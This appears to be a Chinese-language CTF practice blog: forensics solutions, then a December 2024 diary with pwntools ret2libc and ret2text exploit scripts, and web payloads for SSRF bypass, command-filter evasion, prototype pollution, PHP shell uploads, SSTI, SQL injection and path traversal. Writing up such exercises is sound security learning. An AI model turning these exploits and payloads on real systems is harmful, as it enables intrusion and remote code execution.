<h3 id="LitCTF-2024-女装照流量">[LitCTF 2024] 女装照流量</h3>
<p><s><em>对啊， flag 哪里有女装照重要</em></s> 🥵</p>
<p>以为解题关键点是照片结果误入歧途的我是屑</p>
<p>flag.php 才是解题点。</p>
<p>直接搜 flag.php 可以在包 9804 找到 flag.php.zip</p>
<p>发现有解压密码。</p>
<p>可以排查之前发现的 payload , 在包 9783 处发现 base64 编码的压缩命令，里面有压缩密码。</p>
<p>passwd : <code>PaSsw0rd_LitCtF_L0vely_tanJi</code></p>
<p>flag : <code>LitCTF&#123;anTsw0rd_fl0w_is_eAsY_f0r_u&#125;</code></p>
<h3 id="安洵杯-2020-王牌特工">[安洵杯 2020]王牌特工</h3>
<p>磁盘取证。</p>
<p>使用 AccessData FTK Imager 挂载镜像：</p>
<p><img src="image-1.png" alt=""></p>
<p>猜 <code>flagbox</code> 是被加密的卷， veracrypt 解密：</p>
<p><img src="image-2.png" alt=""></p>
<p>R-Studio 打开检查一下有没有能恢复的文件：</p>
<p><img src="image-3.png" alt=""></p>
<p>发现猫腻，看 hexdump ，文件尾部发现：</p>
<p><code>you find me..55yf55qE5a+G56CBOnRoaXNfaXNfYV90cnVlX2tleQ==</code></p>
<p>base64解码得： <code>真的密码:this_is_a_true_key</code></p>
<p>veracrypt 重新解密即可。</p>
<p><code>flag&#123;you_are_a_cool_boy&#125;</code></p>
<hr>
<h2 id="CISCN-CCB-2024">CISCN&amp;CCB 2024</h2>
<h3 id="zeroshell-1">zeroshell_1</h3>
<p>流量包分析题，wireshark 打开</p>
<p>搜索 zeroshell 很容易就可以搜到一个 CVE 漏洞</p>
<p>用这个漏洞的 poc 去搜索，可以看到一个包，它里面的 Request 长这样：</p>
<p><img src="/resources/images/2025-02_assert/2.webp" alt=""></p>
<p>注意到 <code>Referer</code> 和其他的包长得不一样，明显的 Base64 编码，解密即可。</p>
<p><code>flag&#123;6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A&#125;</code></p>
<h3 id="zeroshell-2">zeroshell_2</h3>
<p>利用上面的 poc 直接 <code>cat flag</code> 即可，flag 在 <code>/Database/flag</code> 里。</p>
<p><code>flag&#123;c6045425-6e6e-41d0-be09-95682a4f65c4&#125;</code></p>
<h3 id="zeroshell-3">zeroshell_3</h3>
<p><code>Netstat -ano</code> 发现一个出站：</p>
<p><img src="/resources/images/2025-02_assert/3.webp" alt=""></p>
<p><code>flag&#123;202.115.89.103&#125;</code></p>
<h3 id="zeroshell-4">zeroshell_4</h3>
<p>解决第三问的同时我们可以得到进程的 <code>PID</code> 为 <code>10471</code></p>
<p><code>ls -l /proc/10471/exe</code> 查询进程的可执行文件即可</p>
<p><code>flag&#123;.nginx&#125;</code></p>
<h3 id="WInFT-1">WInFT_1</h3>
<p>基本上都是直接利用虚拟机内的工具解的。</p>
<p>PCHunter 发现计划任务里有猫腻:</p>
<p><img src="/resources/images/2025-02_assert/5.webp" alt=""></p>
<p>描述里是 flag , 套了一层 <code>base64</code> 和 <code>html unicode</code></p>
<p><code>flag&#123;AES_encryption_algorithm_is_an_excellent_encryption_algorithm&#125;</code></p>
<h3 id="WinFT-2">WinFT_2</h3>
<p>CurrPorts 发现可疑点</p>
<p><img src="/resources/images/2025-02_assert/4.webp" alt=""></p>
<p><code>flag&#123;miscsecure.com:192.168.116.130:443&#125;</code></p>
<hr>
<h2 id="2024-全国智能驾驶测试赛（总决赛）车联网安全">2024 全国智能驾驶测试赛（总决赛）车联网安全</h2>
<h3 id="misc-01">misc 01</h3>
<p>hint.txt 里提示了我们密码是纯数字</p>
<p>爆破出压缩包密码</p>
<p>得到一张 png 图片。</p>
<p><img src="/resources/images/2025-02_assert/flag.png" alt=""></p>
<p>stegsolve 打开，发现 B 通道 01234567 均存在隐写</p>
<p><img src="/resources/images/2025-02_assert/6.webp" alt=""></p>
<p>由于存在干扰，多对比几个 flag 然后去重即可得到 flag。</p>
<p>4个重复的字母代表一个字符</p>
<p><code>flag&#123;55dc7554-5faa-441d-88da-253eb5c4154f&#125;</code></p>
<h3 id="misc-02">misc 02</h3>
<p>USB 流量包题目。</p>
<p>利用 <code>UsbKeyboardDataHacker</code> 可以直接爆出第一段 password。</p>
<p>passwd1: <code>v3hicl3_ne7workin9_1s</code></p>
<p>wireshark 发现蓝牙传了一个压缩包，里面是第二段 password 的摩斯密码cyberchef 可以解密.</p>
<p>passwd2: <code>_IMPORTANT_2_U&amp;ME</code></p>
<p>拼接得到完整密码(根据题目描述需要全大写) ：<code>V3HICL3_NE7WORKIN9_1S_IMPORTANT_2_U&amp;ME</code></p>
<p>至于里面的 bmp ，名称提示了要用 <code>wbStego4.3open</code> 。</p>
<p>Decode 后即可得到 flag ，没有密码。</p>
<p><code>flag&#123;_1nt3rnet_0f_Vehicles_4_f4n&#125;</code></p>
]]></content>
      <categories>
        <category>Articles</category>
      </categories>
      <tags>
        <tag>Practice</tag>
      </tags>
  </entry>
  <entry>
    <title>贰零贰肆年拾贰月·散装刷题月记</title>
    <url>/2024/12/04/2024-12%20WriteUp/</url>
    <content><![CDATA[<h1>贰零贰肆年拾贰月刷题月记</h1>
<hr>
<h2 id="说在前面">说在前面</h2>
<p>12 月的前几天都在绝赞补作业中😭</p>
<p>加上又要忙 qwb 青少的一些事，做题时间其实不多。</p>
<p>不过题肯定是不能少刷的。</p>
<p><strong>12-25更新：</strong> 准备期末，开鸽~~</p>
<hr>
<h2 id="Pwn">Pwn</h2>
<h3 id="CTF-Wiki-ret2libc1">CTF Wiki ret2libc1</h3>
<p>做这道题之前去了解了一下一些 pwn 工具的常用操作，果然做题顺了很多。</p>
<p>或许也可能是做 pwn 题目的思维逐渐构建起来了的原因？咱也说不准😅</p>
<p>总之这道题算是比较简单的， <code>system</code> 的 plt 地址和 <code>/bin/sh</code> 都直接给你了。</p>
<p>IDA 找在哪里可以 call 到 <code>system</code> 再找 <code>/bin/sh</code> 字符串地址就行了。</p>
<p>至于 <code>offset</code> ，才发现可以 <code>cyclic</code> 直接梭哈出来，不用自己手算真是太好了。</p>
<p><code>cyclic</code> 填充字符串，查看返回地址后 <code>cyclic -l</code> 找到 <code>offset</code> 是 <code>112</code> 。</p>
<p>直接写脚本打进去：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x8048720</span></span><br><span class="line"></span><br><span class="line">system_plt_addr = <span class="number">0x8048460</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, system_plt_addr, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span>, bin_sh_addr])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>直接通了。</p>
<h3 id="CTF-Wiki-ret2libc2">CTF Wiki ret2libc2</h3>
<p>和上题差不多，但是这一回没有给你 <code>/bin/sh</code> 。</p>
<p>这个时候就需要我们先利用栈溢出 call <code>gets</code> 函数，将 <code>/bin/sh</code> 字符串读入到存在于 <code>bss</code> 段的 <code>buf2</code> 变量中，然后再和上题一样 call <code>system</code> 以 getshell.</p>
<p><em>读入 <code>/bin/sh</code> 的方式和 ret2syscall 中讲的内容有点相似。</em></p>
<p>上 payload ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_plt_addr = <span class="number">0x8048490</span></span><br><span class="line">puts_plt_addr = <span class="number">0x8048460</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x804843d</span></span><br><span class="line">bss2_addr = <span class="number">0x804A080</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt_addr, pop_ebx_addr, bss2_addr, system_plt_addr, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span>, bss2_addr])</span><br><span class="line">bin_sh = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(bin_sh)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="CTF-Wiki-ret2libc3">CTF Wiki ret2libc3</h3>
<p>感觉这才是真正的 ret2libc.</p>
<p>主要的思路就是利用栈溢出调用 <code>puts</code> 函数泄露 <code>__libc_start_main</code> 的地址，根据对应版本 <code>libc.so</code> 中各函数的 offset 是固定且已知的这一点调用 <code>libc</code> 中的 <code>system</code> 函数，获取 <code>/bin/sh</code> 字符串以 getshell.</p>
<p>计算 <code>libc</code> 中函数的偏移可以交给 <code>LibcSearcher</code> 模块，其他的和前两题大同小异。</p>
<p>上 payload :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露 __libc_start_main 的地址并返回 main 函数方便打第二个 payload</span></span><br><span class="line">leak_libc_start = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, leak_libc_start)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># LibcSearcher 算出偏移，拿到 system 和 /bin/sh 的真实地址</span></span><br><span class="line">libc_start_main_addr =  u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libc_base_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="NSSCTF-UUCTF-2022-新生赛-easystack">NSSCTF [UUCTF 2022 新生赛] easystack</h3>
<p>checksec 发现开了 PIE .</p>
<p>IDA 打开，发现有给 backdoor , vuln 里有一个栈溢出。</p>
<p>因为开了 PIE ，只能得到 backdoor 地址的两个字节，最后那个需要爆破</p>
<p>上 payload :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./prog/easystack&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x1185</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span> + p32(backdoor_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>多爆一会就能 getshell 了。</p>
<p>flag : <code>NSSCTF&#123;ab40ec1d-0dfc-457e-b083-092b74750088&#125;</code></p>
<h3 id="NSSCTF-MoeCTF-2021-ret2text">NSSCTF [MoeCTF 2021] ret2text</h3>
<p>有 backdoor , 啥也没开</p>
<p>主函数里有一个栈溢出。</p>
<p>因为是 amd64 , ROPgadget 找个 ret 对齐一下才可以打通。</p>
<p>上 payload ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./prog/ret2text2&quot;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, port)</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x400687</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x400546</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">18</span>, ret_addr, backdoor_addr])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>flag : <code>NSSCTF&#123;42773a7c-c05d-4482-9df0-7b9ab4c49d47&#125;</code></p>
<hr>
<h2 id="Web">Web</h2>
<h3 id="NSSCTF-GKCTF-2020-cve-版签到">NSSCTF [GKCTF 2020] cve 版签到</h3>
<p>热身题：</p>
<p><img src="../resources/images/2024-12_assert/1.webp" alt=""></p>
<p>题目限制了我们只可以访问以 <code>.ctfhub.com</code>结尾的 url.</p>
<p>点击 <code>View CTFHub</code> ，一眼 SSRF：</p>
<p><img src="../resources/images/2024-12_assert/2.webp" alt=""></p>
<p>既然有限制，思路就是 Bypass 过去。</p>
<p>猜测 %00 截断可以生效。</p>
<p><em>题目提示的 CVE 漏洞似乎就是会有 %00 截断，这里是猜的</em></p>
<p>放 payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=http://localhost%00.ctfhub.com</span><br></pre></td></tr></table></figure>
<p><img src="../resources/images/2024-12_assert/3.webp" alt=""></p>
<p>提示要以 <code>123</code> 结尾，那就换种方式打过去：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=http://127.0.0.123%00.ctfhub.com</span><br></pre></td></tr></table></figure>
<p>在响应包中发现 flag 。</p>
<p><img src="../resources/images/2024-12_assert/4.webp" alt=""></p>
<h3 id="NSSCTF-MoeCTF-2021-babyRCE">NSSCTF [MoeCTF 2021] babyRCE</h3>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到确实过滤了很多可以读取 flag 的命令，但是并没有过滤转义字符</p>
<p>上 payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?rce=ca\t%09fla\g.php</span><br></pre></td></tr></table></figure>
<p>这里回显不会直接显示出来，需要 F12 查看。</p>
<p>得到 flag ：<code>NSSCTF&#123;a143b51a-9629-46e5-9567-cef40ba89291&#125;</code></p>
<h3 id="NSSCTF-MoeCTF-2021-fake-game">NSSCTF [MoeCTF 2021] fake game</h3>
<p>最简单的 Node.js 原型链污染。</p>
<p>题目提示我们有 10 点属性可以分配去挑战魔王，点击创建角色会提示<code>勇者已经被 merge 到魔王城了</code></p>
<p>看到 <code>merge</code> 果断联想 Node.js 原型链污染，F12 同时还告诉我们如果我们把属性设置为 0 就会没有这个属性。</p>
<p>可以上 payload 了：</p>
<p><code>&#123;&quot;attributes&quot;:&#123;&quot;health&quot;:0,&quot;attack&quot;:0,&quot;armor&quot;:0,&quot;__proto__&quot;:&#123;&quot;health&quot;:50000,&quot;attack&quot;:50000,&quot;armor&quot;:50000&#125;&#125;&#125;</code></p>
<p>POST 打过去即可，得到 flag : <code>NSSCTF&#123;041ff8fc-8353-4549-b6d9-2a48dbce0211&#125;</code></p>
<h3 id="NSSCTF-FSCTF-2023-签到-plus">NSSCTF [FSCTF 2023] 签到 plus</h3>
<p>题目没有前端，扫目录找到一个 <code>shell.php</code></p>
<p>里面是 phpinfo ，猜测是后门。</p>
<p>观察响应包可以发现其 php 版本是 <code>7.4.21</code> ，有端联想 Development Server 源码泄露。</p>
<p>打开 yakit 的不修复长度，构造请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /shell.php HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /1 HTTP/1.1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>这里一个回车都不可以少，踩坑了</strong></p>
<p>响应：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">$😀=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">$😁=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">$😂=<span class="string">&quot;c&quot;</span>;</span><br><span class="line">$🤣=<span class="string">&quot;d&quot;</span>;</span><br><span class="line">$😃=<span class="string">&quot;e&quot;</span>;</span><br><span class="line">$😄=<span class="string">&quot;f&quot;</span>;</span><br><span class="line">$😅=<span class="string">&quot;g&quot;</span>;</span><br><span class="line">$😆=<span class="string">&quot;h&quot;</span>;</span><br><span class="line">$😉=<span class="string">&quot;i&quot;</span>;</span><br><span class="line">$😊=<span class="string">&quot;j&quot;</span>;</span><br><span class="line">$😋=<span class="string">&quot;k&quot;</span>;</span><br><span class="line">$😎=<span class="string">&quot;l&quot;</span>;</span><br><span class="line">$😍=<span class="string">&quot;m&quot;</span>;</span><br><span class="line">$😘=<span class="string">&quot;n&quot;</span>;</span><br><span class="line">$😗=<span class="string">&quot;o&quot;</span>;</span><br><span class="line">$😙=<span class="string">&quot;p&quot;</span>;</span><br><span class="line">$😚=<span class="string">&quot;q&quot;</span>;</span><br><span class="line">$🙂=<span class="string">&quot;r&quot;</span>;</span><br><span class="line">$🤗=<span class="string">&quot;s&quot;</span>;</span><br><span class="line">$🤩=<span class="string">&quot;t&quot;</span>;</span><br><span class="line">$🤔=<span class="string">&quot;u&quot;</span>;</span><br><span class="line">$🤨=<span class="string">&quot;v&quot;</span>;</span><br><span class="line">$😐=<span class="string">&quot;w&quot;</span>;</span><br><span class="line">$😑=<span class="string">&quot;x&quot;</span>;</span><br><span class="line">$😶=<span class="string">&quot;y&quot;</span>;</span><br><span class="line">$🙄=<span class="string">&quot;z&quot;</span>;</span><br><span class="line"></span><br><span class="line">$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;👽🦐&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($😭(<span class="variable">$_GET</span>[<span class="string">&#x27;👽🦐&#x27;</span>]));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shell.php?👽🦐=cat%20/flag.txt</span><br></pre></td></tr></table></figure>
<h3 id="NSSCTF-HGAME-2023-week1-Classic-Childhood-Game">NSSCTF [HGAME 2023 week1] Classic Childhood Game</h3>
<p>前端题，代码审计。</p>
<p>在 <code>Event.js</code> 里审到一个 <code>mota()</code> 很可疑，控制台运行一下：</p>
<p><img src="../resources/images/2024-12_assert/5.webp" alt=""></p>
<h3 id="NSSCTF-FSCTF-2023-是兄弟，就来传你の🐎！">NSSCTF [FSCTF 2023] 是兄弟，就来传你の🐎！</h3>
<p>文件上传。</p>
<p>正常上传一句话木马无效，改传图片马会显示图片过大。</p>
<p>测试后发现后端有对后缀名和上传文件格式的验证。</p>
<p>尝试这样打一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;00.gif&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">GIF&lt;?=`nl /*`;</span><br></pre></td></tr></table></figure>
<p>有回显上传路径，直接访问无效。</p>
<p>.htaccess 也无法覆写，尝试绕过后缀名黑名单</p>
<p>尝试 .pht 发现上传成功</p>
<p>最终 payload :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;00.pht&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">GIF&lt;?=`nl /*`;</span><br></pre></td></tr></table></figure>
<p>访问即可得到 flag .<code>NSSCTF&#123;f6c55439-a3f5-4cac-9150-908485db4178&#125;</code></p>
<h3 id="NSSCTF-LitCTF-2023-Vim-yyds">NSSCTF [LitCTF 2023] Vim yyds</h3>
<p>很明显的提示，vim 源码泄露</p>
<p>访问 /.index.php.swp 得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;Give_Me_Your_Flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$password</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>🐎都给我塞好了，POST 传个 <code>$password</code> 的 base64 就可以用 <code>$cmd</code> RCE 了</p>
<p><img src="../resources/images/2024-12_assert/10.webp" alt=""></p>
<h3 id="NSSCTF-MoeCTF-2022-Sqlmap-boy">NSSCTF [MoeCTF 2022] Sqlmap_boy</h3>
<pre><code>好，我用 SQLmap (bushi)
</code></pre>
<p>先用万能密码登录：<code>admin&quot; or 1=1 #</code></p>
<p>闭合方式可以 F12 找到。</p>
<p>漏了一个注入点：<code>http://node5.anna.nssctf.cn:port/secrets.php?id=1</code></p>
<p>直接用 SQLmap 打的话，会打不通，后端会验证 cookie ，所以要加上你登录成功后的 cookie ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://node5.anna.nssctf.cn:port/secrets.php?id=1&quot;</span> --random-agent --cookie <span class="string">&quot;HMACCOUNT=D9085B78E5D3B21B;Hm_lpvt_648a44a949074de73151ffaa0a832aec=1734506930;Hm_lvt_648a44a949074de73151ffaa0a832aec=1734173647,1734180461,1734440965,1734500731;PHPSESSID=8b2282a7260168a07ece5f3924a24c34&quot;</span> -D moectf -T flag -C flAg -dump</span><br></pre></td></tr></table></figure>
<p><code>NSSCTF&#123;3083258c-28aa-4c14-81c6-bc6103e770ff&#125;</code></p>
<h3 id="NSSCTF-HUBUCTF-2022-新生赛-ezsql">NSSCTF [HUBUCTF 2022 新生赛] ezsql</h3>
<p>dirsearch 扫一下，有源码泄露在 <code>www.tar.gz</code> 里</p>
<p>漫长的代码审计。。。</p>
<p>在 <code>update.php</code> 里面发现了华点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update users set age=<span class="subst">$_POST</span>[age],nickname=&#x27;<span class="subst">$_POST</span>[nickname]&#x27;,description=&#x27;<span class="subst">$_POST</span>[description]&#x27; where id=<span class="subst">$_SESSION</span>[id]&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>是一个 update 注入，在 <code>age</code> 处。</p>
<p>同时在 <code>register.php</code> 中我们发现密码被套了一层 MD5 和一层 hex.</p>
<p><code>age=1,password=0x31333935353233353234356232343937%23</code> 设置所有密码为 <code>123123</code>.</p>
<p>登录，在 admin 的 description 处发现 flag.</p>
<p><code>NSSCTF&#123;e9fbc1a8-b509-4925-ac89-821bd2e4d757&#125;</code></p>
<h3 id="NSSCTF-LitCTF-2024-高亮主题-划掉-背景查看器">NSSCTF [LitCTF 2024] 高亮主题 ( 划掉 ) 背景查看器</h3>
<p>Yakit 抓一下主题切换的 Request ，发现是直接请求的 php 文件。</p>
<p><code>theme=../../../../../../../../../../../flag</code></p>
<p>一万层目录穿越一把梭.</p>
<p>flag: <code>NSSCTF&#123;1bdb7278-fdd4-4e35-af6d-f647be26cda5&#125;</code></p>
<h3 id="NSSCTF-SCTF-2021-loginme">NSSCTF [SCTF 2021] loginme</h3>
<p>代码审计 + 模板注入</p>
<p>提示我们 flag 在 password 里面</p>
<p>需要用本地地址访问才可以进入可以 ssti 的页面</p>
<p>Request 里面加个 <code>X-Real-IP: 127.0.0.1</code> 即可</p>
<p><code>/id=0&amp;age=&#123;&#123;.Password&#125;&#125;</code> 得到 flag</p>
<p>flag: <code>SCTF&#123;E@zy_SIGn_Ch3eR!&#125;</code></p>
<h3 id="NSSCTF-NCTF-2018-Flask-PLUS">NSSCTF [NCTF 2018] Flask PLUS</h3>
<p>一个不明所以的页面。</p>
<p>点击底下切换 demo 时有报错</p>
<p>发现报错信息里含有请求的网址，猜测存在 ssti</p>
<p>测试：</p>
<p><img src="../resources/images/2024-12_assert/11.webp" alt=""></p>
<p>用之前发现的一个神奇 payload 一把梭：</p>
<p><code>&#123;&#123;lipsum.__globals__['o'+'s']['pop''en']('ls /').read()&#125;&#125;</code></p>
<p><img src="../resources/images/2024-12_assert/12.webp" alt=""></p>
<hr>
<h2 id="MISC">MISC</h2>
<h3 id="NSSCTF-UTCTF-2020-Observe-closely">NSSCTF [UTCTF 2020] Observe closely</h3>
<p>下载后得到一张图片，分辨率和大小对应不上，猜测藏了东西</p>
<p>010 Editor 打开，在文件末尾发现：</p>
<p><img src="../resources/images/2024-12_assert/6.webp" alt=""></p>
<p><img src="../resources/images/2024-12_assert/7.webp" alt=""></p>
<p>是一个 zip 压缩包，缺少了文件头，加上去解压：</p>
<p><img src="../resources/images/2024-12_assert/8.webp" alt=""></p>
<p>解压出来运行就好。</p>
<p><img src="../resources/images/2024-12_assert/9.webp" alt=""></p>
<h3 id="NSSCTF-SWPU-2020-套娃">NSSCTF [SWPU 2020] 套娃</h3>
<p>套了一坨 xlsx 文件。</p>
<p>第一层塞了一个 rc4 密文。</p>
<p>第二层塞了一个带 rc4 密文 key 的压缩包，但是被加密了。</p>
<p>第三层则是一个打不开的压缩包，010打开可以在尾部发现第二层压缩包的解压密码。</p>
<p>最后 rc4 解密即可。</p>
<p>flag ： <code>NSSCTF&#123;ef1a73d40977a49b99b871980f355757&#125;</code></p>
